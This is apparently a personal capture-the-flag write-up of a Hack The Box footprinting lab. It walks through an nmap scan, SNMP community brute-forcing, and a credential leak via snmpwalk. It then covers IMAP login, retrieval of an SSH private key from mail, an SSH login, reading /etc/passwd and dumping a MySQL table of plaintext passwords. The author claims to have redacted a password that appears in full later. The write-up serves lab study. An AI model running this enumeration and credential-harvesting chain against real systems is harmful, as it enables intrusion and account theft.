---
title: HTB - Footprinting Lab (Hard)
categories: [htb]
tags: [htb]     # TAG names should always be lowercase
---

Mainly notes for self...



First we can start off with a routine NMAP scan:

```bash
nmap -sV 10.129.100.246
```

Output:
```bash
$ nmap -sV 10.129.100.246
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-30 19:51 CDT
Nmap scan report for 10.129.100.246
Host is up (0.21s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.13 seconds
```

This shows us that the target is using Linux and has 5 ports open.

When trying to connect to the IMAP service:

```bash
$ openssl s_client 10.129.100.246:imaps
```

Output:
```bash
$ openssl s_client 10.129.100.246:imaps
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = NIXHARD
verify return:1
... cut ...
$ a LIST "" *                   
a BAD Error in IMAP command received by server.
 ```

It successfully connects to the server but since we don't have any credentials, we can't do much. We'll come back to this command later...

Using the SNMP scanner, onesixtyone, we can try to see if we get any hits:

```bash
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.100.246
```

Output:
```bash
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.100.246
Scanning 1 hosts, 3219 communities
10.129.100.246 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

We got a hit! We can now use snmpwalk to inspect the backup:

```bash
$ snmpwalk -v2c -c backup 10.129.100.246
```

Output:
```bash
└──╼ [★]$ snmpwalk -v2c -c backup 10.129.100.246
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (456143) 1:16:01.43
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (33) 0:00:00.33
... cut ...
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom (password)"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, err
```

We have found the user and password combo! (I redacted the password so people can't just copy paste). Now we can go back to the IMAP service and have a proper look-around.

```bash
$ openssl s_client 10.129.100.246:imaps
```

Output:
```bash
a LOGIN tom NMds732Js2761
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

$ a LIST "" *
* LIST (\HasNoChildren \UnMarked) "." Notes
* LIST (\HasNoChildren \UnMarked) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
a OK List completed (0.001 + 0.000 secs).

$ a SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a OK [READ-WRITE] Select completed (0.001 + 0.000 secs).

$ a FETCH 1 BODY[]
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
... cut ...
-----END OPENSSH PRIVATE KEY-----
)
a OK Fetch completed (0.001 + 0.000 secs).
```

We found an OpenSSH private key that can we now most likely use for the SSH port we found at the start of this writeup. First, we can copy that entire key and simply paste it into a file:

```bash
nano ssh_key
Then exit-> save buffer -> choose name and press enter
```

Once we've put the key into a file, we should not forget to change the permissions of the file so we can use it: 

 ```bash
chmod 600 ssh_key
```

Now, logging into the SSH server:

```bash
ssh -i ssh_key tom@10.129.100.246
```

Output: 
```bash
└──╼ [★]$ ssh -i ssh_key tom@10.129.100.246
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 31 May 2025 01:39:51 AM UTC

  System load:  0.0               Processes:               167
  Usage of /:   70.0% of 5.40GB   Users logged in:         1
  Memory usage: 30%               IPv4 address for ens192: 10.129.100.246
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

```

We are in! Now we can have a quick look around the passwd file:

```bash
tom@NIXHARD:~/Maildir/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
... cut ...
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1002:1002:,,,:/home/tom:/bin/bash
dovecot:x:113:120:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:115:121:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
```

The interesting thing here is a MySQL server cred which is our next plan of atack:

```bash
tom@NIXHARD:~/Maildir/tmp$ mysql -u tom -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> 

```

We see a users database which could contain juicy info. Lets try it...

```bash
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+------+-------------------+------------------------------+
| id   | username          | password                     |
+------+-------------------+------------------------------+
|    1 | ppavlata0         | 6znAfvTbB2                   |
|    2 | ktofanini1        | TP2NxFD62e                   |
|    3 | rallwell2         | t1t7WaqvEfv                  |
|    4 | efernier3         | ZRYOBO9PI                    |
|    5 | fpoon4            | 5Spyx2Jb                     |
|    6 | jgurnell5         | LMCnWKD                      |
|    7 | aminter6          | ngCyGg3                      |
|    8 | dwattinham7       | H2bpGC5                      |
|    9 | ddumphreys8       | eGek5Q8                      |
... cut ...
```

Great! Scrolling down through the user's table, we can see a user called "HTB" and the password which happens to be the flag!
